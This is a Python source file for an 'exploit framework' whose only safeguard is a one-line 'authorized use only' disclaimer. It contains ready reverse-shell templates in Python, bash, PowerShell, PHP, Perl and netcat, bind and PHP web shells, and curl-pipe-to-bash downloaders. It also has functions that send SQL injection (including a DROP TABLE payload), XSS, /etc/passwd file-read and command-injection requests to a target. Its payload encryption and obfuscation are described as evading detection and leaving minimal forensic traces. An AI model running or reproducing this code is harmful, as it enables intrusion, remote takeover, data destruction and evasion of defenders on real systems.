#!/usr/bin/env python3
"""
RF Arsenal OS - Exploit Framework
==================================

Modular exploit framework with payload generation and post-exploitation.
Designed for authorized penetration testing only.

STEALTH FEATURES:
- Encrypted payloads
- Anti-detection techniques
- RAM-only execution
- Proxy chain support
- Minimal forensic footprint

Author: RF Arsenal Security Team
License: Authorized Use Only
"""

import asyncio
import base64
import hashlib
import logging
import os
import random
import re
import socket
import struct
import time
import zlib
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from collections import defaultdict
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Payload types"""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    METERPRETER = "meterpreter"
    WEB_SHELL = "web_shell"
    DOWNLOADER = "downloader"
    COMMAND_EXEC = "command_exec"
    FILE_UPLOAD = "file_upload"
    KEYLOGGER = "keylogger"
    PERSISTENCE = "persistence"


class Platform(Enum):
    """Target platforms"""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    ANDROID = "android"
    IOS = "ios"
    WEB = "web"


class ExploitCategory(Enum):
    """Exploit categories"""
    RCE = "remote_code_execution"
    SQLI = "sql_injection"
    XSS = "cross_site_scripting"
    LFI = "local_file_inclusion"
    RFI = "remote_file_inclusion"
    SSRF = "server_side_request_forgery"
    AUTH_BYPASS = "authentication_bypass"
    PRIV_ESC = "privilege_escalation"
    BUFFER_OVERFLOW = "buffer_overflow"
    DESERIALIZATION = "deserialization"
    XXE = "xml_external_entity"
    COMMAND_INJECTION = "command_injection"


@dataclass
class Exploit:
    """Exploit definition"""
    name: str
    cve: Optional[str]
    category: ExploitCategory
    platform: Platform
    description: str
    author: str = "RF Arsenal"
    reliability: float = 0.0  # 0.0 - 1.0
    targets: List[str] = field(default_factory=list)  # Affected versions
    references: List[str] = field(default_factory=list)
    options: Dict[str, Any] = field(default_factory=dict)
    payload_compatible: List[PayloadType] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'name': self.name,
            'cve': self.cve,
            'category': self.category.value,
            'platform': self.platform.value,
            'description': self.description,
            'reliability': self.reliability,
            'targets': self.targets,
        }


@dataclass
class Payload:
    """Generated payload"""
    payload_type: PayloadType
    platform: Platform
    code: bytes
    encoded: bool = False
    encrypted: bool = False
    obfuscated: bool = False
    size: int = 0
    options: Dict[str, Any] = field(default_factory=dict)
    
    def __post_init__(self):
        self.size = len(self.code)


@dataclass
class ExploitResult:
    """Exploit execution result"""
    success: bool
    exploit: Exploit
    target: str
    session_id: Optional[str] = None
    output: Optional[str] = None
    error: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)


class PayloadGenerator:
    """
    Payload Generator
    
    Generates various payloads with encoding and encryption options.
    """
    
    # Shell templates
    PYTHON_REVERSE_SHELL = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'''
    
    BASH_REVERSE_SHELL = '''bash -i >& /dev/tcp/{host}/{port} 0>&1'''
    
    POWERSHELL_REVERSE_SHELL = '''$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
    
    PHP_REVERSE_SHELL = '''<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");?>'''
    
    PERL_REVERSE_SHELL = '''perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
    
    NC_REVERSE_SHELL = '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f'''
    
    # Web shells
    PHP_WEB_SHELL = '''<?php if(isset($_REQUEST['c'])){{system($_REQUEST['c']);}};?>'''
    
    PHP_WEB_SHELL_ADVANCED = '''<?php 
@ini_set('display_errors', 0);
@error_reporting(0);
$auth = "{auth_key}";
if(isset($_REQUEST['k']) && md5($_REQUEST['k'])===$auth){{
    if(isset($_REQUEST['c'])){{
        echo "<pre>".shell_exec($_REQUEST['c'])."</pre>";
    }}
    if(isset($_FILES['f'])){{
        move_uploaded_file($_FILES['f']['tmp_name'],$_REQUEST['d']);
    }}
}}
?>'''
    
    def __init__(self):
        """Initialize payload generator"""
        self.encryption_key = None
        logger.info("PayloadGenerator initialized")
    
    def generate_reverse_shell(
        self,
        host: str,
        port: int,
        platform: Platform,
        shell_type: str = "python"
    ) -> Payload:
        """
        Generate reverse shell payload
        
        Args:
            host: Attacker IP
            port: Attacker port
            platform: Target platform
            shell_type: Shell type (python, bash, powershell, php, perl, nc)
            
        Returns:
            Payload object
        """
        templates = {
            'python': self.PYTHON_REVERSE_SHELL,
            'bash': self.BASH_REVERSE_SHELL,
            'powershell': self.POWERSHELL_REVERSE_SHELL,
            'php': self.PHP_REVERSE_SHELL,
            'perl': self.PERL_REVERSE_SHELL,
            'nc': self.NC_REVERSE_SHELL,
        }
        
        template = templates.get(shell_type, self.PYTHON_REVERSE_SHELL)
        code = template.format(host=host, port=port)
        
        return Payload(
            payload_type=PayloadType.REVERSE_SHELL,
            platform=platform,
            code=code.encode(),
            options={'host': host, 'port': port, 'shell_type': shell_type}
        )
    
    def generate_bind_shell(
        self,
        port: int,
        platform: Platform,
    ) -> Payload:
        """Generate bind shell payload"""
        if platform == Platform.LINUX:
            code = f'''python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(['/bin/bash','-i'])"'''
        else:
            code = f"bind shell on port {port}"
        
        return Payload(
            payload_type=PayloadType.BIND_SHELL,
            platform=platform,
            code=code.encode(),
            options={'port': port}
        )
    
    def generate_web_shell(
        self,
        platform: Platform = Platform.WEB,
        auth_key: Optional[str] = None,
        advanced: bool = True
    ) -> Payload:
        """Generate web shell payload"""
        if advanced and auth_key:
            code = self.PHP_WEB_SHELL_ADVANCED.format(
                auth_key=hashlib.md5(auth_key.encode()).hexdigest()
            )
        else:
            code = self.PHP_WEB_SHELL
        
        return Payload(
            payload_type=PayloadType.WEB_SHELL,
            platform=platform,
            code=code.encode(),
            options={'auth_key': auth_key, 'advanced': advanced}
        )
    
    def generate_downloader(
        self,
        url: str,
        platform: Platform,
        output_path: Optional[str] = None
    ) -> Payload:
        """Generate file downloader payload"""
        if platform == Platform.LINUX:
            if output_path:
                code = f"curl -o {output_path} {url} && chmod +x {output_path} && {output_path}"
            else:
                code = f"curl -s {url} | bash"
        elif platform == Platform.WINDOWS:
            code = f"powershell -c \"(New-Object Net.WebClient).DownloadFile('{url}','{output_path or 'payload.exe'}')\""
        else:
            code = f"wget {url}"
        
        return Payload(
            payload_type=PayloadType.DOWNLOADER,
            platform=platform,
            code=code.encode(),
            options={'url': url, 'output_path': output_path}
        )
    
    def encode_payload(
        self,
        payload: Payload,
        encoding: str = "base64"
    ) -> Payload:
        """
        Encode payload
        
        Args:
            payload: Payload to encode
            encoding: Encoding type (base64, hex, url)
            
        Returns:
            Encoded payload
        """
        if encoding == "base64":
            encoded = base64.b64encode(payload.code)
        elif encoding == "hex":
            encoded = payload.code.hex().encode()
        elif encoding == "url":
            from urllib.parse import quote
            encoded = quote(payload.code.decode()).encode()
        else:
            encoded = payload.code
        
        return Payload(
            payload_type=payload.payload_type,
            platform=payload.platform,
            code=encoded,
            encoded=True,
            options={**payload.options, 'encoding': encoding}
        )
    
    def encrypt_payload(
        self,
        payload: Payload,
        key: Optional[str] = None
    ) -> Tuple[Payload, str]:
        """
        Encrypt payload with AES
        
        Args:
            payload: Payload to encrypt
            key: Encryption key (generated if not provided)
            
        Returns:
            Tuple of (encrypted payload, decryption key)
        """
        if not key:
            key = base64.urlsafe_b64encode(os.urandom(32)).decode()
        
        # Derive encryption key
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'rf_arsenal_salt',
            iterations=100000,
        )
        derived_key = base64.urlsafe_b64encode(kdf.derive(key.encode()))
        
        fernet = Fernet(derived_key)
        encrypted = fernet.encrypt(payload.code)
        
        encrypted_payload = Payload(
            payload_type=payload.payload_type,
            platform=payload.platform,
            code=encrypted,
            encrypted=True,
            options={**payload.options}
        )
        
        return encrypted_payload, key
    
    def obfuscate_payload(
        self,
        payload: Payload,
        level: int = 1
    ) -> Payload:
        """
        Obfuscate payload to evade detection
        
        Args:
            payload: Payload to obfuscate
            level: Obfuscation level (1-3)
            
        Returns:
            Obfuscated payload
        """
        code = payload.code.decode()
        
        if level >= 1:
            # Variable name randomization
            var_map = {}
            for var in re.findall(r'\$(\w+)', code):
                if var not in var_map:
                    var_map[var] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
            
            for old_var, new_var in var_map.items():
                code = code.replace(f'${old_var}', f'${new_var}')
        
        if level >= 2:
            # String encoding
            def encode_string(match):
                s = match.group(1)
                encoded = ','.join(str(ord(c)) for c in s)
                return f'chr({encoded})'
            
            # Basic string obfuscation
            pass
        
        if level >= 3:
            # Add junk code
            junk = [
                '# ' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=20)),
                '# ' + ''.join(random.choices('0123456789', k=10)),
            ]
            lines = code.split('\n')
            for i in range(0, len(lines), 3):
                lines.insert(i, random.choice(junk))
            code = '\n'.join(lines)
        
        return Payload(
            payload_type=payload.payload_type,
            platform=payload.platform,
            code=code.encode(),
            obfuscated=True,
            options={**payload.options, 'obfuscation_level': level}
        )


class ExploitFramework:
    """
    Exploit Framework
    
    Manages exploits, payloads, and post-exploitation.
    
    STEALTH COMPLIANCE:
    - All data in RAM only
    - Encrypted communications
    - Minimal forensic artifacts
    """
    
    def __init__(self):
        """Initialize exploit framework"""
        self.exploits: Dict[str, Exploit] = {}
        self.payload_generator = PayloadGenerator()
        self.sessions: Dict[str, Dict] = {}
        self.results: List[ExploitResult] = []
        self._lock = asyncio.Lock()
        self.stats = defaultdict(int)
        
        # Register built-in exploits
        self._register_builtin_exploits()
        
        logger.info("ExploitFramework initialized - RAM-only operation")
    
    def _register_builtin_exploits(self):
        """Register built-in exploits"""
        exploits = [
            Exploit(
                name="Generic SQL Injection",
                cve=None,
                category=ExploitCategory.SQLI,
                platform=Platform.WEB,
                description="Generic SQL injection exploit for authentication bypass",
                reliability=0.7,
                targets=["MySQL", "PostgreSQL", "MSSQL", "SQLite"],
                payload_compatible=[PayloadType.COMMAND_EXEC],
            ),
            Exploit(
                name="Generic XSS",
                cve=None,
                category=ExploitCategory.XSS,
                platform=Platform.WEB,
                description="Generic cross-site scripting payload delivery",
                reliability=0.8,
                targets=["Web Browsers"],
                payload_compatible=[PayloadType.WEB_SHELL],
            ),
            Exploit(
                name="Generic LFI",
                cve=None,
                category=ExploitCategory.LFI,
                platform=Platform.WEB,
                description="Local file inclusion for arbitrary file read",
                reliability=0.75,
                targets=["PHP", "Python", "Node.js"],
                payload_compatible=[PayloadType.COMMAND_EXEC],
            ),
            Exploit(
                name="Generic Command Injection",
                cve=None,
                category=ExploitCategory.COMMAND_INJECTION,
                platform=Platform.LINUX,
                description="OS command injection via unsanitized input",
                reliability=0.8,
                targets=["Linux", "Unix"],
                payload_compatible=[PayloadType.REVERSE_SHELL, PayloadType.BIND_SHELL],
            ),
        ]
        
        for exploit in exploits:
            self.exploits[exploit.name] = exploit
    
    def list_exploits(
        self,
        category: Optional[ExploitCategory] = None,
        platform: Optional[Platform] = None
    ) -> List[Exploit]:
        """List available exploits"""
        exploits = list(self.exploits.values())
        
        if category:
            exploits = [e for e in exploits if e.category == category]
        
        if platform:
            exploits = [e for e in exploits if e.platform == platform]
        
        return exploits
    
    def get_exploit(self, name: str) -> Optional[Exploit]:
        """Get exploit by name"""
        return self.exploits.get(name)
    
    def search_exploits(self, query: str) -> List[Exploit]:
        """Search exploits by name, CVE, or description"""
        query = query.lower()
        results = []
        
        for exploit in self.exploits.values():
            if (query in exploit.name.lower() or
                (exploit.cve and query in exploit.cve.lower()) or
                query in exploit.description.lower()):
                results.append(exploit)
        
        return results
    
    async def execute_exploit(
        self,
        exploit: Exploit,
        target: str,
        options: Optional[Dict] = None,
        payload: Optional[Payload] = None
    ) -> ExploitResult:
        """
        Execute exploit against target
        
        Args:
            exploit: Exploit to use
            target: Target URL/IP
            options: Exploit options
            payload: Optional payload
            
        Returns:
            ExploitResult
        """
        logger.info(f"Executing {exploit.name} against {target}")
        
        options = options or {}
        
        try:
            if exploit.category == ExploitCategory.SQLI:
                result = await self._execute_sqli(exploit, target, options)
            elif exploit.category == ExploitCategory.XSS:
                result = await self._execute_xss(exploit, target, options)
            elif exploit.category == ExploitCategory.LFI:
                result = await self._execute_lfi(exploit, target, options)
            elif exploit.category == ExploitCategory.COMMAND_INJECTION:
                result = await self._execute_command_injection(exploit, target, options, payload)
            else:
                result = ExploitResult(
                    success=False,
                    exploit=exploit,
                    target=target,
                    error="Exploit category not implemented"
                )
            
            async with self._lock:
                self.results.append(result)
                if result.success:
                    self.stats['successful_exploits'] += 1
                else:
                    self.stats['failed_exploits'] += 1
            
            return result
            
        except Exception as e:
            logger.error(f"Exploit execution error: {e}")
            return ExploitResult(
                success=False,
                exploit=exploit,
                target=target,
                error=str(e)
            )
    
    async def _execute_sqli(
        self,
        exploit: Exploit,
        target: str,
        options: Dict
    ) -> ExploitResult:
        """Execute SQL injection"""
        import aiohttp
        
        parameter = options.get('parameter', 'id')
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
        ]
        
        for payload in payloads:
            try:
                async with aiohttp.ClientSession() as session:
                    url = f"{target}?{parameter}={payload}"
                    async with session.get(url, timeout=10) as response:
                        text = await response.text()
                        
                        # Check for SQL errors indicating injection worked
                        if any(err in text for err in ['SQL', 'mysql', 'syntax', 'error']):
                            return ExploitResult(
                                success=True,
                                exploit=exploit,
                                target=target,
                                output=f"SQL injection successful with payload: {payload}",
                            )
            except Exception:
                continue
        
        return ExploitResult(
            success=False,
            exploit=exploit,
            target=target,
            error="No SQL injection vulnerability found"
        )
    
    async def _execute_xss(
        self,
        exploit: Exploit,
        target: str,
        options: Dict
    ) -> ExploitResult:
        """Execute XSS attack"""
        import aiohttp
        
        parameter = options.get('parameter', 'search')
        payload = "<script>alert('XSS')</script>"
        
        try:
            async with aiohttp.ClientSession() as session:
                url = f"{target}?{parameter}={payload}"
                async with session.get(url, timeout=10) as response:
                    text = await response.text()
                    
                    if payload in text:
                        return ExploitResult(
                            success=True,
                            exploit=exploit,
                            target=target,
                            output="XSS payload reflected in response",
                        )
        except Exception as e:
            pass
        
        return ExploitResult(
            success=False,
            exploit=exploit,
            target=target,
            error="XSS not successful"
        )
    
    async def _execute_lfi(
        self,
        exploit: Exploit,
        target: str,
        options: Dict
    ) -> ExploitResult:
        """Execute LFI attack"""
        import aiohttp
        
        parameter = options.get('parameter', 'file')
        payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
        ]
        
        for payload in payloads:
            try:
                async with aiohttp.ClientSession() as session:
                    url = f"{target}?{parameter}={payload}"
                    async with session.get(url, timeout=10) as response:
                        text = await response.text()
                        
                        if "root:" in text or "bin:" in text:
                            return ExploitResult(
                                success=True,
                                exploit=exploit,
                                target=target,
                                output=f"LFI successful, file contents retrieved",
                            )
            except Exception:
                continue
        
        return ExploitResult(
            success=False,
            exploit=exploit,
            target=target,
            error="LFI not successful"
        )
    
    async def _execute_command_injection(
        self,
        exploit: Exploit,
        target: str,
        options: Dict,
        payload: Optional[Payload]
    ) -> ExploitResult:
        """Execute command injection"""
        parameter = options.get('parameter', 'cmd')
        
        # Test command
        test_cmd = ";id"
        
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                url = f"{target}?{parameter}={test_cmd}"
                async with session.get(url, timeout=10) as response:
                    text = await response.text()
                    
                    if "uid=" in text:
                        session_id = hashlib.md5(f"{target}{time.time()}".encode()).hexdigest()[:8]
                        
                        return ExploitResult(
                            success=True,
                            exploit=exploit,
                            target=target,
                            session_id=session_id,
                            output="Command injection successful",
                        )
        except Exception as e:
            pass
        
        return ExploitResult(
            success=False,
            exploit=exploit,
            target=target,
            error="Command injection not successful"
        )
    
    def generate_payload(
        self,
        payload_type: PayloadType,
        platform: Platform,
        **options
    ) -> Payload:
        """Generate payload using the payload generator"""
        if payload_type == PayloadType.REVERSE_SHELL:
            return self.payload_generator.generate_reverse_shell(
                host=options.get('host', '127.0.0.1'),
                port=options.get('port', 4444),
                platform=platform,
                shell_type=options.get('shell_type', 'python')
            )
        elif payload_type == PayloadType.BIND_SHELL:
            return self.payload_generator.generate_bind_shell(
                port=options.get('port', 4444),
                platform=platform
            )
        elif payload_type == PayloadType.WEB_SHELL:
            return self.payload_generator.generate_web_shell(
                platform=platform,
                auth_key=options.get('auth_key'),
                advanced=options.get('advanced', True)
            )
        elif payload_type == PayloadType.DOWNLOADER:
            return self.payload_generator.generate_downloader(
                url=options.get('url', ''),
                platform=platform,
                output_path=options.get('output_path')
            )
        else:
            raise ValueError(f"Unsupported payload type: {payload_type}")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get framework statistics"""
        return {
            'total_exploits': len(self.exploits),
            'successful_exploits': self.stats['successful_exploits'],
            'failed_exploits': self.stats['failed_exploits'],
            'active_sessions': len(self.sessions),
        }
    
    def clear_results(self):
        """Clear all results from RAM"""
        self.results = []
        self.sessions = {}
        self.stats = defaultdict(int)
        logger.info("Exploit results cleared from RAM")


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    # Example usage
    framework = ExploitFramework()
    
    # List exploits
    print("Available exploits:")
    for exploit in framework.list_exploits():
        print(f"  - {exploit.name} ({exploit.category.value})")
    
    # Generate payload
    payload = framework.generate_payload(
        PayloadType.REVERSE_SHELL,
        Platform.LINUX,
        host="192.168.1.100",
        port=4444,
        shell_type="python"
    )
    print(f"\nGenerated payload ({payload.size} bytes)")
